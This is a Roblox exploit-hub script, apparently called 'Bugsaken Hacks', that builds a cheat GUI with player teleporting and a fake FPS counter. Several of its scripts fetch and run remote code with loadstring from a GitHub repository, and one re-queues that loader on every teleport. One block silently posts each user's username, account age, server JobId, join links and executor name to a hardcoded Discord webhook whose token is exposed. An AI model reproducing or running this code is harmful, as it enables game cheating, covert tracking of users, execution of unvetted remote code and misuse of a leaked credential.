G2L["1d1"] = Instance.new("Folder", G2L["1"]);
G2L["1d1"]["Name"] = [[PremiumMode]];


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup
G2L["1d2"] = Instance.new("CanvasGroup", G2L["1d1"]);
G2L["1d2"]["Visible"] = false;
G2L["1d2"]["BorderSizePixel"] = 0;
G2L["1d2"]["BackgroundColor3"] = Color3.fromRGB(4, 49, 40);
G2L["1d2"]["Size"] = UDim2.new(0.1925, 0, 0.42944, 0);
G2L["1d2"]["Position"] = UDim2.new(0.58098, 0, 0.28055, 0);
G2L["1d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.UICorner
G2L["1d3"] = Instance.new("UICorner", G2L["1d2"]);
G2L["1d3"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.UIStroke
G2L["1d4"] = Instance.new("UIStroke", G2L["1d2"]);



-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.TextLabel
G2L["1d5"] = Instance.new("TextLabel", G2L["1d2"]);
G2L["1d5"]["TextWrapped"] = true;
G2L["1d5"]["BorderSizePixel"] = 0;
G2L["1d5"]["TextSize"] = 14;
G2L["1d5"]["TextScaled"] = true;
G2L["1d5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d5"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d5"]["BackgroundTransparency"] = 1;
G2L["1d5"]["Size"] = UDim2.new(0.63091, 0, 0.19455, 0);
G2L["1d5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d5"]["Text"] = [[Enter Password]];
G2L["1d5"]["Position"] = UDim2.new(0.20505, 0, 0.07393, 0);


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.TextBox
G2L["1d6"] = Instance.new("TextBox", G2L["1d2"]);
G2L["1d6"]["BorderSizePixel"] = 0;
G2L["1d6"]["TextWrapped"] = true;
G2L["1d6"]["TextSize"] = 14;
G2L["1d6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d6"]["TextScaled"] = true;
G2L["1d6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d6"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d6"]["Size"] = UDim2.new(0.63091, 0, 0.19455, 0);
G2L["1d6"]["Position"] = UDim2.new(0.18297, 0, 0.49027, 0);
G2L["1d6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d6"]["Text"] = [[]];


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.TextBox.TextButton
G2L["1d7"] = Instance.new("TextButton", G2L["1d6"]);
G2L["1d7"]["TextWrapped"] = true;
G2L["1d7"]["BorderSizePixel"] = 0;
G2L["1d7"]["TextSize"] = 14;
G2L["1d7"]["TextScaled"] = true;
G2L["1d7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d7"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d7"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["1d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d7"]["Text"] = [[ENTER]];
G2L["1d7"]["Position"] = UDim2.new(0.25, 0, 1, 0);


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.TextBox.TextButton.UIStroke
G2L["1d8"] = Instance.new("UIStroke", G2L["1d7"]);
G2L["1d8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.TextBox.TextButton.UICorner
G2L["1d9"] = Instance.new("UICorner", G2L["1d7"]);
G2L["1d9"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.TextBox.UIStroke
G2L["1da"] = Instance.new("UIStroke", G2L["1d6"]);
G2L["1da"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.TextBox.UICorner
G2L["1db"] = Instance.new("UICorner", G2L["1d6"]);
G2L["1db"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.UIAspectRatioConstraint
G2L["1dc"] = Instance.new("UIAspectRatioConstraint", G2L["1d2"]);
G2L["1dc"]["AspectRatio"] = 1.23346;


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.UIDragDetector
G2L["1dd"] = Instance.new("UIDragDetector", G2L["1d2"]);



-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.Close
G2L["1de"] = Instance.new("TextButton", G2L["1d2"]);
G2L["1de"]["TextWrapped"] = true;
G2L["1de"]["BorderSizePixel"] = 0;
G2L["1de"]["TextSize"] = 14;
G2L["1de"]["TextScaled"] = true;
G2L["1de"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1de"]["BackgroundColor3"] = Color3.fromRGB(255, 25, 25);
G2L["1de"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1de"]["Size"] = UDim2.new(0.08651, 0, 0.84425, 0);
G2L["1de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1de"]["Text"] = [[X]];
G2L["1de"]["Name"] = [[Close]];
G2L["1de"]["Position"] = UDim2.new(0.89822, 0, 0.07449, 0);


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.Close.UICorner
G2L["1df"] = Instance.new("UICorner", G2L["1de"]);
G2L["1df"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.Close.UIStroke
G2L["1e0"] = Instance.new("UIStroke", G2L["1de"]);
G2L["1e0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.PremiumMode.CanvasGroup.Close.UIAspectRatioConstraint
G2L["1e1"] = Instance.new("UIAspectRatioConstraint", G2L["1de"]);



-- StarterGui.Real Deal V2.UhmUhUhAdminMode?
G2L["1e2"] = Instance.new("LocalScript", G2L["1"]);
G2L["1e2"]["Name"] = [[UhmUhUhAdminMode?]];
-- Attributes
G2L["1e2"]:SetAttribute([[what]], false);


-- StarterGui.Real Deal V2.LocalScript
local function C_2()
local script = G2L["2"];
	script.Parent:WaitForChild("Main"):WaitForChild("CanvasGroup").Visible = false
	
	function missing(t, f, fallback)
		if type(f) == t then return f end
		return fallback
	end
	local StarterGui = game:GetService("StarterGui")
	
	everyClipboard = missing("function", setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set))
	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			StarterGui:SetCore("SendNotification", {
				Title = "Copied",
				Text =  txt .. " to clipboard!",
				Duration = 3, -- seconds
			})
		else
			StarterGui:SetCore("SendNotification", {
				Title = "Notifier",
				Text = "Your Exploit Dosent Allow You To Copy Text So If You Want Join Our Discord Manually https://discord.gg/UT2Fw4vpQT",
				Duration = 10, -- seconds
			})
		end
	end
	
	toClipboard("https://discord.gg/UT2Fw4vpQT")
end;
task.spawn(C_2);
-- StarterGui.Real Deal V2.KeyORELSE
local function C_3()
local script = G2L["3"];
	--KEYSYSTEM FOR PASTEBIN CHANGE IF YOU WANT TO USE THIS
	--BLANK SPACE FOR ME TO NOTICE
	
	if game.Players.LocalPlayer.Name == "ThisMyLoginBlue" then --Works Maby Untested BTW 
		--KeySystem
		_G.KeysForKeySystem = {
			"WATERMELON",
			"ORANGE"
		} 
	else
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SeaKarate/bugsakenhacks/refs/heads/main/Keys"))()
	end
	
	local lowerkeys = {}
	for i,v in ipairs(_G.KeysForKeySystem) do
		lowerkeys[i] = string.lower(v)
	end
	
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local keysystemenabled = false
	
	-- Disable for specific players
	if player.Name == "nabhia_8767" or player.Name == "ThisMyLoginBlue" then
		keysystemenabled = false
	end
	
	-- Disable if today is Friday, Saturday or Sunday
	local dayOfWeek = tonumber(os.date("%w")) -- 0 = Sunday, 1 = Monday, ..., 6 = Saturday
	if dayOfWeek == 0 or dayOfWeek == 5 or dayOfWeek == 6 then
		keysystemenabled = false
	end
	
	local keySystem = script.Parent:WaitForChild("KeySystem")
	local canvasGroup = keySystem:WaitForChild("CanvasGroup")
	local textBox = canvasGroup:WaitForChild("TextBox")
	local textButton = textBox:WaitForChild("TextButton")
	local closeButton = canvasGroup:WaitForChild("Close")
	local gui = script.Parent:WaitForChild("Main")
	
	if not keysystemenabled then
		keySystem:Destroy()
	else
		canvasGroup.Visible = true
		gui.Parent = nil
	end
	
	textButton.MouseButton1Down:Connect(function()
		local inputKey = textBox.Text
		if table.find(lowerkeys, string.lower(inputKey)) then
			gui.Parent = player:WaitForChild("PlayerGui"):WaitForChild("Real Deal V2")
			keySystem:Destroy()
		end
	end)
	
	closeButton.MouseButton1Down:Connect(function()
		gui:Destroy()
	end)
	
end;
task.spawn(C_3);
-- StarterGui.Real Deal V2.LocalScript
local function C_4()
local script = G2L["4"];
	local hex = string.format("0x%02X%02X%02X",
		math.random(0,255),
		math.random(0,255),
		math.random(0,255))
	if game.Players.LocalPlayer.Name ~= "ThisMyLoginBlue" then
		local MarSer = game:GetService("MarketplaceService")
	
		local success,info =
			pcall(function()
				return
				MarSer:GetProductInfo(game.PlaceId)
			end)
	
		function SendMessage(url, message)
			local http = game:GetService("HttpService")
			local headers = {
				["Content-Type"] = "application/json"
			}
			local data = {
				["content"] = message
			}
			local body = http:JSONEncode(data)
			local response = request({
				Url = url,
				Method = "POST",
				Headers = headers,
				Body = body
			})
		end
	
		function SendMessageEMBED(url, embed)
			local http = game:GetService("HttpService")
			local headers = {
				["Content-Type"] = "application/json"
			}
			local data = {
				["embeds"] = {
					{
						["title"] = embed.title,
						["description"] = embed.description,
						["color"] = embed.color,
						["fields"] = embed.fields,
						["footer"] = {
							["text"] = embed.footer.text
						}
					}
				}
			}
			local body = http:JSONEncode(data)
			local response = request({
				Url = url,
				Method = "POST",
				Headers = headers,
				Body = body
			})
		end
	
	
		--Examples 
	
		local url = "https://discord.com/api/webhooks/1436606361449402370/7d11rqKRFzBhIibs0zZLt5t0w3mHdqaBN3Idw3DdyCjh1JHxsgPjSWx4-jbEXWIVaRq_"
		SendMessage(url)
	
	
		local embed = {
			["title"] = "Forsaken Hacks",
			["description"] = "Ran At " .. os.date(),
			["color"] = --[[tonumber(hex),]] tonumber(0x11570E), --[[use 0x and a hex number here]]
			["fields"] = {
				{
					["name"] = "Name",
					["value"] =  "```" .. game.Players.LocalPlayer.DisplayName .. " (" .. game.Players.LocalPlayer.Name .. ")" .. "```"
				},
				{
					["name"] = "Account Age",
					["value"] = "```" .. game.Players.LocalPlayer.AccountAge .. " Days" .. "```"
				},
				{
					["name"] = "Ran From",
					["value"] = "```" .. info.Name .. "```"
				},
				{
					["name"] = "Game Join Link",
					["value"] = "https://www.roblox.com/games/" .. game.PlaceId
				},
				{
					["name"] = "Join JobId Instance Working",
					["value"] = "https://fishstrap.app/joingame?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
				},
				{
					["name"] = "JobId",
					["value"] = "```" .. game.JobId .. "```"
				},
				{
					["name"] = "Join JobId Instance",
					["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. "'" .. game.PlaceId .. "'" .. "," .. "'" .. game.JobId .. "'" .. ",game.Players.LocalPlayer)```"
				},
				{
					["name"] = "Executor Name",
					["value"] = "```" .. identifyexecutor() .. "```"
				},
				{
					["name"] = "Join JobId Instance (Copy)",
					["value"] = "```" .. "https://fishstrap.app/joingame?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```"
				}
	
			},
			["footer"] = {
				["text"] = "Bugsaken Hacks Btw WAY TOO MANY"
			}
		}
		SendMessageEMBED(url, embed)
		script:Destroy()
	end
	--Dont You dare mention this to me https://pastebin.com/NEdvSV7i GOT IT IDIOT
	
	
	
	
end;
task.spawn(C_4);
-- StarterGui.Real Deal V2.Blacklist
local function C_5()
local script = G2L["5"];
	local NAMES = {
		"MonaList",
		"Minecraft" -- example names
	}
	
	local player = game.Players.LocalPlayer
	
	if table.find(NAMES, player.Name) then
		script.Parent:Destroy()
	end
	
end;
task.spawn(C_5);
-- StarterGui.Real Deal V2.WarningForBadExecutors
local function C_6()
local script = G2L["6"];
	local badexecutors = {
		"xeno",
		"solara"
	}
	if game.Players.LocalPlayer.Name ~= "ThisMyLoginBlue" then
	if table.find(badexecutors,string.lower(identifyexecutor())) then
		script.Parent:WaitForChild("Warning").Visible = true
	else
		script.Parent:WaitForChild("Warning"):Destroy()
	end
	end
end;
task.spawn(C_6);
-- StarterGui.Real Deal V2.LocalScript
local function C_7()
local script = G2L["7"];
	function missing(t, f, fallback)
		if type(f) == t then return f end
		return fallback
	end
	
	local queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
	local TeleportService = game:GetService("TeleportService")
	game.Players.LocalPlayer.OnTeleport:Connect(function()
		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/SeaKarate/bugsakenhacks/refs/heads/main/Main.lua'))()")
	end)
end;
task.spawn(C_7);
-- StarterGui.Real Deal V2.AlrRunnin
local function C_8()
local script = G2L["8"];
	if _G.BugsakenHacksRunning then
		script.Parent:Destroy()
		_G.BugsakenHacksRunning = false
		task.wait(0.6)
	end
	_G.BugsakenHacksRunning = true
end;
task.spawn(C_8);
-- StarterGui.Real Deal V2.LocalScript
local function C_9()
local script = G2L["9"];
	if _G.STARTTHEMFING then
		for i,v in ipairs(script.Parent:GetChildren()) do
			if v.Name ~= "THESEIDOTS" then
				v:Destroy()
			end
		end
	end
	local m = false
	while _G.STARTTHEMFING do
		m = true 
		task.wait(0.2)
		break
	end
	while m do
		task.wait(0.2)
		_G.STARTTHEMFING = true
	end
end;
task.spawn(C_9);
-- StarterGui.Real Deal V2.Main.TpUI.LocalScript
local function C_c()
local script = G2L["c"];
	local a = script.Parent:WaitForChild("TextButton"):WaitForChild("ScrollingFrame"):WaitForChild("exit").MouseButton1Down
	
	a:Connect(function()
		script.Parent:WaitForChild("MainFrame").Visible = false
		script.Parent:WaitForChild("TextButton").Visible = false
		script.Parent:WaitForChild("TPUI").Visible = false
	end)
end;
task.spawn(C_c);
-- StarterGui.Real Deal V2.Main.TpUI.MainFrame.Dragg
local function C_f()
local script = G2L["f"];
	local UIS = game:GetService("UserInputService")
	local frame = script.Parent
	
	local dragging
	local dragStart
	local startPos
	local startPos1
	local startPos2
	
	-- When you start dragging
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
			startPos1 = frame.Parent:WaitForChild("TextButton").Position
			startPos2 = frame.Parent:WaitForChild("TPUI").Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	-- Track mouse movement globally (not just inside the frame)
	UIS.InputChanged:Connect(function(input)
		if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
			local delta = input.Position - dragStart
			frame.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
			frame.Parent:WaitForChild("TextButton").Position = UDim2.new(
				startPos1.X.Scale,
				startPos1.X.Offset + delta.X,
				startPos1.Y.Scale,
				startPos1.Y.Offset + delta.Y
			)
			frame.Parent:WaitForChild("TPUI").Position = UDim2.new(
				startPos2.X.Scale,
				startPos2.X.Offset + delta.X,
				startPos2.Y.Scale,
				startPos2.Y.Offset + delta.Y
			)
		end
	end)
	
end;
task.spawn(C_f);
-- StarterGui.Real Deal V2.Main.TpUI.TextButton.LocalScript
local function C_13()
local script = G2L["13"];
	local TweenService = game:GetService("TweenService")
	local TweenStyle = TweenInfo.new(0.4, Enum.EasingStyle.Exponential)
	local Players = game:GetService("Players")
	
	local mainthing = script.Parent.Parent.Parent:WaitForChild("TpUI")
	local player = Players.LocalPlayer
	local mainFrame = script.Parent.Parent:WaitForChild("MainFrame")
	local frameButton = mainthing:WaitForChild("TextButton") -- main toggle button
	local frame = frameButton:WaitForChild("ScrollingFrame")
	local templateButton = frame:WaitForChild("TextButton") -- player button template
	local exitButton = script.Parent:WaitForChild("ScrollingFrame"):WaitForChild("exit") -- your exit button
	
	-- Initial setup
	frameButton.Text = "V"
	frame.Visible = false
	exitButton.Visible = false
	mainFrame.Size = UDim2.new(0.297, 0,0.074, 0)
	mainFrame.UICorner.CornerRadius = UDim.new(0.1, 0)
	templateButton.Size = UDim2.new(0.025, 0,0.074, 0)
	templateButton.Visible = false
	
	local open = false
	local tweening = false
	
	local buttonsNotToDestroy = {
		["exit"] = true,
	}
	
	local function playTweenOnce(instance, tweenInfo, goalTable, onComplete)
		local tween = TweenService:Create(instance, tweenInfo, goalTable)
		local conn
		conn = tween.Completed:Connect(function()
			if conn then conn:Disconnect() end
			if onComplete then
				pcall(onComplete)
			end
		end)
		tween:Play()
		return tween
	end
	
	frameButton.MouseButton1Click:Connect(function()
		if tweening then return end
		tweening = true
		open = not open
	
		if open then
			-- EXPAND
			frame.Visible = true
			mainFrame.UICorner.CornerRadius = UDim.new(0.05, 0)
			frameButton.Text = "^"
	
			-- Remove old player buttons (except template and excluded)
			for _, child in pairs(frame:GetChildren()) do
				if child:IsA("TextButton") and child ~= templateButton and not buttonsNotToDestroy[child.Name:lower()] then
					child:Destroy()
				end
			end
	
			-- Create player buttons
			local buttonHeightScale = 0.035
			local players = Players:GetPlayers()
			for index, targetPlayer in ipairs(players) do
				local clone = templateButton:Clone()
				clone.Name = targetPlayer.Name
				clone.Text = targetPlayer.Name
				clone.Size = UDim2.new(0.94, 0, buttonHeightScale, 0)
				clone.Position = UDim2.new(0, 0, buttonHeightScale * (index - 1), 0)
				clone.Visible = true
				clone.Parent = frame
	
				local img = Instance.new("ImageLabel")
				img.Size = UDim2.new(0, 40, 0, 40)
				img.Position = UDim2.new(0, 5, 0, 5)
				img.BackgroundTransparency = 1
				img.Parent = clone
	
				task.spawn(function()
					local success, thumbnail = pcall(function()
						return Players:GetUserThumbnailAsync(targetPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
					end)
					if success and thumbnail then
						img.Image = thumbnail
					end
				end)
	
				if not buttonsNotToDestroy[clone.Name:lower()] then
					clone.MouseButton1Click:Connect(function()
						if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
							local hrp = targetPlayer.Character.HumanoidRootPart
							if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
								player.Character.HumanoidRootPart.CFrame = hrp.CFrame + Vector3.new(0, 5, 0)
							end
						end
					end)
				end
			end
	
			-- Expand tween
			playTweenOnce(mainFrame, TweenStyle, {Size = UDim2.new(0.297, 0,0.385, 0)}, function()
				tweening = false
			end)
			task.wait(0.056)
			exitButton.Visible = true
		else
			-- COLLAPSE
			frameButton.Text = "V"
			mainFrame.UICorner.CornerRadius = UDim.new(0.25, 0)
	
			-- Instantly hide all content (buttons + scrolling frame + exit button)
			exitButton.Visible = false
			for _, child in pairs(frame:GetChildren()) do
				if child:IsA("GuiObject") then
					child.Visible = false
				end
			end
			frame.Visible = false
	
			-- Collapse tween
			playTweenOnce(mainFrame, TweenStyle, {Size = UDim2.new(0.297, 0,0.074, 0)}, function()
				-- Cleanup after animation
				for _, child in pairs(frame:GetChildren()) do
					if child:IsA("TextButton") and child ~= templateButton and not buttonsNotToDestroy[child.Name:lower()] then
						child:Destroy()
					end
				end
				tweening = false
			end)
		end
	end)
	
end;
task.spawn(C_13);
-- StarterGui.Real Deal V2.Main.TpUI.TextButton.ScrollingFrame.exit.LocalScript
local function C_16()
local script = G2L["16"];
	script.Parent.Parent:WaitForChild("exit").MouseButton1Down:Connect(function()
		script.Parent.Parent.Parent.Parent:WaitForChild("MainFrame").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("TextButton").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("TPUI").Visible = false
	end)
end;
task.spawn(C_16);
-- StarterGui.Real Deal V2.Main.FPSCounter.LocalScript
local function C_1e()
local script = G2L["1e"];
	script.Parent:WaitForChild("TextBox").Visible = false
	script.Parent:WaitForChild("R").Visible = false
	script.Parent:WaitForChild("G").Visible = false
	script.Parent:WaitForChild("B").Visible = false
	script.Parent:WaitForChild("TextButton").Visible = false
end;
task.spawn(C_1e);
-- StarterGui.Real Deal V2.Main.FPSCounter.Disable
local function C_1f()
local script = G2L["1f"];
	script.Parent:WaitForChild("CanvasGroup").Visible = false
end;
task.spawn(C_1f);
-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.LocalScript
local function C_22()
local script = G2L["22"];
	local RunService = game:GetService("RunService")
	local fpsLabel = script.Parent
	
	local fps = 0
	local lastTime = tick()
	local frames = 0
	
	RunService.RenderStepped:Connect(function()
		frames += 1
		local now = tick()
		local delta = now - lastTime
	
		if delta >= 1 then
			-- Calculate real FPS once per second
			fps = frames / delta
			frames = 0
			lastTime = now
	
			-- Check attribute
			local useFakeFPS = fpsLabel:GetAttribute("fakefps")
	
			if useFakeFPS then
				fpsLabel.Text = "FPS: " .. math.random(script.Parent:GetAttribute("Min"), script.Parent:GetAttribute("Max"))
			else
				-- Show real FPS
				fpsLabel.Text = "FPS: " .. math.floor(fps + 0.5)
			end
		end
	end)
	
end;
task.spawn(C_22);
-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.TextButton.LocalScript
local function C_24()
local script = G2L["24"];
	script.Parent.MouseButton1Down:Connect(function()
		local success,result = pcall(function()
			for i,v in pairs(script.Parent.Parent.Parent.Parent.Parent:WaitForChild("FPSCounter"):GetChildren()) do
				if not v:IsA("LocalScript") then
					v.Visible = false
				end
			end
		end)
		if success then
		else
			warn(result)
		end
	end)
end;
task.spawn(C_24);
-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.ImageButton.LocalScript
local function C_28()
local script = G2L["28"];
	local YOUTURNEDMEONLIKEALIGHTSWITCH = false
	
	script.Parent.MouseButton1Down:Connect(function()
		YOUTURNEDMEONLIKEALIGHTSWITCH = not(YOUTURNEDMEONLIKEALIGHTSWITCH)
		if YOUTURNEDMEONLIKEALIGHTSWITCH == true then
		script.Parent.Parent.Parent.Parent:WaitForChild("TextBox").Visible = true
		script.Parent.Parent.Parent.Parent:WaitForChild("R").Visible = true
		script.Parent.Parent.Parent.Parent:WaitForChild("G").Visible = true
		script.Parent.Parent.Parent.Parent:WaitForChild("B").Visible = true
		script.Parent.Parent.Parent.Parent:WaitForChild("TextButton").Visible = true
		elseif YOUTURNEDMEONLIKEALIGHTSWITCH == false then
			script.Parent.Parent.Parent.Parent:WaitForChild("TextBox").Visible = false
			script.Parent.Parent.Parent.Parent:WaitForChild("R").Visible = false
			script.Parent.Parent.Parent.Parent:WaitForChild("G").Visible = false
			script.Parent.Parent.Parent.Parent:WaitForChild("B").Visible = false
			script.Parent.Parent.Parent.Parent:WaitForChild("TextButton").Visible = false
		end
	end)
end;
task.spawn(C_28);
-- StarterGui.Real Deal V2.Main.FPSCounter.TextButton.LocalScript
local function C_2f()
local script = G2L["2f"];
	local button = script.Parent
	local textLabel = button.Parent:WaitForChild("CanvasGroup"):WaitForChild("TextLabel")
	
	script.Parent:SetAttribute("on",false)
	
	button.MouseButton1Down:Connect(function()
		local newstate = not(script.Parent:GetAttribute("on"))
		script.Parent:SetAttribute("on", newstate)
	
		if not script.Parent:GetAttribute("on") then
			textLabel:SetAttribute("fakefps", false)
			button.Text = "Fake Fps? : OFF"
			return
		end
	
		-- when toggled ON
		local maxBox = button:WaitForChild("Max")
		local minBox = button:WaitForChild("Min")
	
		local maxText, minText = maxBox.Text, minBox.Text
		local maxNum, minNum = tonumber(maxText), tonumber(minText)
	
		-- Check that both are valid positive numbers
		if maxNum and minNum and maxText:match("^%d+$") and minText:match("^%d+$") then
			-- ✅ If max < min, swap them
			if maxNum < minNum then
				local temp = maxNum
				maxNum = minNum
				minNum = temp
				script.Parent.Text = "YOU IDIOT IT SAYS MIN VALUE AND MAX VALUE"
				task.wait(2.5)
				if script.Parent:GetAttribute("on") then
					script.Parent.Text = "Fake Fps? : ON"
				else
					script.Parent.Text = "Fake Fps? : OFF"
				end
			end
	
			textLabel:SetAttribute("Min", minNum)
			textLabel:SetAttribute("Max", maxNum)
		else
			-- Handle negative or invalid input
			if maxText:match("%-%d+") or minText:match("%-%d+") then
				button.Text = "Negative Numbers Not Supported"
				task.wait(1)
			end
			-- Fallback defaults
			textLabel:SetAttribute("Min", 80)
			textLabel:SetAttribute("Max", 90)
			button.Text = "Fake Fps? : OFF"
			script.Parent:SetAttribute("on",false)
			return
		end
	
		textLabel:SetAttribute("fakefps", true)
		button.Text = "Fake Fps? : ON"
	end)
	
end;
task.spawn(C_2f);
-- StarterGui.Real Deal V2.Main.FPSCounter.TextBox.TextButton.LocalScript
local function C_38()
local script = G2L["38"];
	local Hex = 636363
	
	script.Parent.MouseButton1Down:Connect(function()
		Hex = script.Parent.Parent.Text
		script.Parent.Parent.Parent:WaitForChild("CanvasGroup"):WaitForChild("TextLabel").BackgroundColor3 = Color3.fromHex(Hex)
	end)
end;
task.spawn(C_38);
-- StarterGui.Real Deal V2.Main.FPSCounter.B.TextButton.LocalScript
local function C_41()
local script = G2L["41"];
	local R = nil
	local G = nil
	local B = nil
	
	script.Parent.MouseButton1Down:Connect(function()
		B = script.Parent.Parent.Text
		R = script.Parent.Parent.Parent:WaitForChild("R").Text
		G = script.Parent.Parent.Parent:WaitForChild("G").Text
		
		script.Parent.Parent.Parent:WaitForChild("CanvasGroup"):WaitForChild("TextLabel").BackgroundColor3 = Color3.fromRGB(R,G,B)
	end)
end;
task.spawn(C_41);
-- StarterGui.Real Deal V2.Main.CanvasGroup.Tab
local function C_44()
local script = G2L["44"];
	for i,v in pairs(script.Parent:WaitForChild("THETABS"):GetChildren()) do
		v.Visible = false
	end
	
	script.Parent:WaitForChild("THETABS"):WaitForChild("STOPSKIDDIN").Visible = true
end;
task.spawn(C_44);
-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.Drag
local function C_48()
local script = G2L["48"];
	local UIS = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	
	local frame = script.Parent
	local canvas = script.Parent.Parent
	
	local dragging = false
	local dragStart
	local startPos
	
	-- Smoothing settings
	local tweenTime = 0.3 -- smaller = faster response, larger = smoother
	
	-- When you start dragging
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = canvas.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	-- Track mouse movement globally (not just inside the frame)
	UIS.InputChanged:Connect(function(input)
		if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
			local delta = input.Position - dragStart
			local goalPos = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
	
			-- Tween smoothly to the new position
			TweenService:Create(canvas, TweenInfo.new(tweenTime, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
				Position = goalPos
			}):Play()
		end
	end)
	
end;
task.spawn(C_48);
-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.MainText.NOTURBUSSINESS
local function C_4b()
local script = G2L["4b"];
	if game.Players.LocalPlayer.Name == "ThisMyLoginBlue" then
		--DONT SKID
		_G.WATERBOTTLE = "Bugsaken Hacks"
		--DONT SKID (2)
		_G.WATERBOTTLEWATER = "https://scriptblox.com/script/Forsaken-Bugsaken-Hub-65398"
		_G.WATERBOTTLEWATERWATER = "OFFICIAL LINK https://scriptblox.com /script/Forsaken- Bugsaken-Hub-65398"
	else
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SeaKarate/bugsakenhacks/refs/heads/main/DontSkid"))()
	end
	local thetabs = script.Parent.Parent.Parent.Parent.Parent:WaitForChild("Main"):WaitForChild("CanvasGroup"):WaitForChild("THETABS"):WaitForChild("STOPSKIDDIN"):WaitForChild("TextLabel")
	
	if script.Parent.Text ~= _G.WATERBOTTLE or thetabs:WaitForChild("TextButton"):GetAttribute("DONTCHANGE") ~= _G.WATERBOTTLEWATER or thetabs.Text ~= _G.WATERBOTTLEWATERWATER then
		script.Parent.Parent.Parent.Parent.Parent:WaitForChild("THESEIDOTS"):WaitForChild("CanvasGroup").Visible = true
		_G.BugsakenHacksRunning = false
		_G.STARTTHEMFING = true
		task.wait(0.6)
		for i,v in pairs(script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("Real Deal V2"):GetChildren()) do
			if v.Name ~= "THESEIDOTS" then
				v:Destroy()
			end
		end
	else
		script.Parent.Parent.Parent.Parent.Parent:WaitForChild("THESEIDOTS"):Destroy()
	end
end;
task.spawn(C_4b);
-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.Close.LocalScript
